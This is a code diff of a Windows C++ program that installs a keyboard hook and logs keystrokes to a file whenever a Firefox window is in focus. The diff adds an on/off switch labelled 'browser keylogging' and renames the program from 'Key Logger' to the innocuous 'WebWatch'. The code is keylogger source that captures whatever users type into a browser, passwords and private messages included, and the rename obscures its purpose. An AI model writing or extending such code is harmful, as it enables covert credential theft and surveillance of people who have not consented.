@@ -21,7 +21,7 @@ HWND hwndInternetAccess;
 std::ofstream logFile;
 
 NOTIFYICONDATA nid;
-bool inetEnabled = true;
+bool browserKeyLogging = true;
 
 bool AddHostEntry(const std::string& domain, const std::string& ipAddress)
 {
@@ -83,7 +83,7 @@ LRESULT CALLBACK KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             const auto fireandfox = std::string("Firefox");
 
             // Check if the window title contains browser keywords
-            if (title.contains(fireandfox))
+            if (title.contains(fireandfox) && browserKeyLogging)
             {
                 // Handle the key press and log it
                 logFile << vkCode << " ";
@@ -130,12 +130,12 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                                              170, 145, 150, 30,
                                              hwnd, nullptr, nullptr, nullptr);
 
-            CreateWindow("STATIC", "Activate / Deactivate Internet access time.",
+            CreateWindow("STATIC", "Activate / Deactivate browser keylogging.",
                          WS_VISIBLE | WS_CHILD,
                          10, 195, 360, 20,
                          hwnd, nullptr, nullptr, nullptr);
 
-            hwndInternetAccess = CreateWindow("BUTTON", "Block",
+            hwndInternetAccess = CreateWindow("BUTTON", "Activate / Deactivate",
                                            WS_VISIBLE | WS_CHILD | BS_PUSHBUTTON,
                                            10, 225, 150, 30,
                                            hwnd, nullptr, nullptr, nullptr);
@@ -264,20 +264,15 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
                 localtime_s(&currentTime, &now);
 
                 // Check if the current time is within the specified range (8 am to 8 pm)
-                if (!inetEnabled)
+                if (!browserKeyLogging)
                 {
-                    // Internet access is allowed
-                    //setInternetAccess(true);
-                    //SetInternetConnection(true);
-                    MessageBox(hwnd, "Internet access is allowed.", "Success", MB_OK | MB_ICONINFORMATION);
-                    inetEnabled = true;
+                    MessageBox(hwnd, "Browser Keylogging enabled.", "Success", MB_OK | MB_ICONINFORMATION);
+                    browserKeyLogging = true;
                 }
                 else
                 {
-                    // Internet access is blocked
-                    //SetInternetConnection(true);
-                    MessageBox(hwnd, "Internet access is blocked.", "Error", MB_OK | MB_ICONERROR);
-                    inetEnabled = false;
+                    MessageBox(hwnd, "Browser Keylogging disabled.", "Success", MB_OK | MB_ICONINFORMATION);
+                    browserKeyLogging = false;
                 }
             }
             else if ((reinterpret_cast<HWND>(lParam) == nullptr) && (LOWORD(wParam) == 1))
@@ -363,7 +358,7 @@ LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam)
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
-    const wchar_t CLASS_NAME[] = L"KeyLogger";
+    const wchar_t CLASS_NAME[] = L"WebWatch";
 
     WNDCLASS wc = {};
     wc.lpfnWndProc = WindowProc;
@@ -375,7 +370,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     HWND hwnd = CreateWindowEx(
             0,                              // Optional window styles.
             reinterpret_cast<LPCSTR>(CLASS_NAME),                     // Window class
-            reinterpret_cast<LPCSTR>(L"Key Logger"),                  // Window text
+            reinterpret_cast<LPCSTR>(L"WebWatch"),                  // Window text
             WS_OVERLAPPEDWINDOW,            // Window style
 
             // Size and position
@@ -391,6 +386,23 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     {
         return 0;
     }
+
+    int screenWidth = GetSystemMetrics(SM_CXSCREEN);
+    int screenHeight = GetSystemMetrics(SM_CYSCREEN);
+
+    // Get window dimensions
+    RECT rect;
+    GetWindowRect(hwnd, &rect);
+    int windowWidth = rect.right - rect.left;
+    int windowHeight = rect.bottom - rect.top;
+
+    // Calculate window position
+    int posX = (screenWidth - windowWidth) / 2;
+    int posY = (screenHeight - windowHeight) / 2;
+
+    // Set window position
+    SetWindowPos(hwnd, NULL, posX, posY, 0, 0, SWP_NOSIZE | SWP_NOZORDER);
+
 
     ShowWindow(hwnd, nCmdShow);
 
